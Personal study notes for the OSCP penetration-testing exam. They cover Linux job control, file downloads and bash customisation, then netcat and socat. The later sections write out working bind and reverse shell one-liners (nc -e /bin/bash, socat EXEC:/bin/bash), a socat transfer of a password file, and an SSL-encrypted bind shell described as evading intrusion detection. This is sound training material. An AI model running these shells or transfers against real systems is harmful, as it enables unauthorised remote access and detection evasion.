# OSCP Notes

## Manging process

_To suspend the job_ - `ctrl + z`  
_To cancel the job_ - `ctrl + c`  
_To list background process_ 
```
bg
```
_To list jobs that are running in the current terminal session_
```
jobs
```
_To return a job to the foreground_
```
fg
fg %1 or %2..n
```
_To run a designated command or script at regular intervals_
```
watch -n 2 <path/of/command/or/script>
```
---
## Downloading files
Linux
```bash
wget -O <file_name> <full_url_path>
curl -o <file_name> <full_url_path>
axel -a -n <num:eg:20> -o <file_name> <full_url_path> (-n specify the number of connection)
```
Windows
```powershell
powershell -command wget -o <file_name> <full_url_path>
powershell -command curl -o <file_name> <full_url_path>
powershell -command Invoke-WebRequest <url> -O <file.jpg>
```
---

## Customizing the Bash Environmeent
_Bash history customization_
```bash
export HISTCONTROL=ignoredups
export HISTIGNORE="&:ls:[bf]g:exit:history"
history
export HISTTIMEFORMAT='%F %T '
```
- HISTCONTROL - _to remove duplicates from our bash history_
- HISTIGNORE - _a variable is particularly useful for filtering out basic commands that frequently, such as ls,exit,history.bg,etc._
-  HISTTIMEFORMAT - _to include the data/time in our bash history_
___
_Alias_

Aliases are useful for replacing commonly used commands and switches with a shorter command or alias, that we define.
```bash
alias cls='clear'
alias mdkir='ping -c 1 localhost'
```
***note: the alias command doesn't have any restrictions on the words used for an alias,therefore it is possible to create an alias using a word that already corresponds to an existing command.***

_unalias_
```bash
unalias mkdir
```
solution for alias if we overwrite existing command use unalias or exit the current session 

---
_Persistent Bash Customization_
 
***/etc/bash.bashrc*** - behavior of interactive shells in bash is defined in this file.

***~/.bashrc*** - behavior of specific users shell.

- make changes this file like adding alias to this will make it 
persistent alias.
- HISTSIZE and HISTFILESIZE environment variables values can be changed.

---
# Practical Tools
## Netcat
- First released in 1995 by ***HOBIT*** 
- Also known as "Swiss Army Knife".
- *Hobbit* himself: a simple utility which reads and writes data across network connections, using TCP or UDP protocols.

_1. Connecting to a TCP/UDP Port_  

- Client mode :
```bash
nc -nv <ip-address> <port>
```

_2. Listening on a TCP/UDP Port_

- Listening mode(chat)
```powershell
nc -nlvp <port>
```

- Connection mode:(chat)
 ```bash
 nc -nv <ip> <port>
 ```
 
_3. Tranferring FIles with NetCat_

note : dd(a disk copying utility(Forensics investigators))
 
Linux &rarr; Windows
 - on Windows
 ```cmd
 nc -nlvp 4444 > incoming.wxe
 ```
 - on Linux
 ```bash
 nc -nv <ip> <port> < /usr/share/windows-resources/binaries/wget.exe
 ```
 
Windows &rarr; Linux

 - on Linux 
 ```bash
 nc -nvlp 4444 > incoming.txt
 ```
 
 - on Windows 
 ```cmd
 nc -nv <ip> <port> < outgoing.txt
```

_4. Remote Administration with Netcat_

##NetCat Bind Shell 

_DGaping security hole_

- client(Bon)
```bash
nc -nlvp 4444 -e cmd.exe
```
- Helper(Alice)
```bash
nc -nv 10.11.0.22 4444
```
![Bind Shell](https://i.imgur.com/uryYaJa.png)

---
##NetCat Reverse Shell 

- client(Alice)
```bash
nc -nlvp 4444
```
- helper(Bob)
```bash
nc -nv 10.11.0.22 4444 -e /bin/bash
```
![Reverse Shell](https://i.imgur.com/jeTs3lq.png)
---
#Socat
- It is a command-line utlity that establishes tow bidirectional byte streams and transfers data between them. For Penetration testing.
- It is similar to Netcat but has additional useful features.

## Netcat vs Socat
- connection mode:(chat)
```bash
nc <remote server's ip address> 80 
socat - TCP4:<remote sever's ip address>:80
```
_note: we require root privilege to bind listener to ports below 1024_
- listening mode:(chat)
```bash
sudo nc -lvp localhost 443
sudo socat TCP4-LISTEN:443 STDOUT
```
##Socat File Transfers
Alice need to send Bob 
- Linux &rarr; Windows
 - On Linux 
     - ```bash
     sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
 ```
 - On Windows
     - ```bash
     socat TCP4:10.11.0.4.:443 file:received_secret_passwords.txt,create
     ```
---
## Socat Reverse Shells
- On window
```bash
    socat -d TCP4-LISTEN:443 STDOUT
```
- On Linux
```bash
    socat TCP4:<IP address>:443 EXEC:/bin/bash
```
## Socat Encrypt Bind Shells
_Note:- Secure Socket Layer certificates. 
This level of encryption will assist in evading intrusion detection system(IDS) and will help hide the sensitive data we are transceiving._
![](https://i.imgur.com/rJRoHmo.png)
![](https://i.imgur.com/tYfIwOT.png)
- Creating self-signed certificate

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt

cat bind_shell.key bind_shell.crt > bind_shell.pem
```

- Listening using SSL
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem, verify=0,fork EXEC:/bin/bash
```
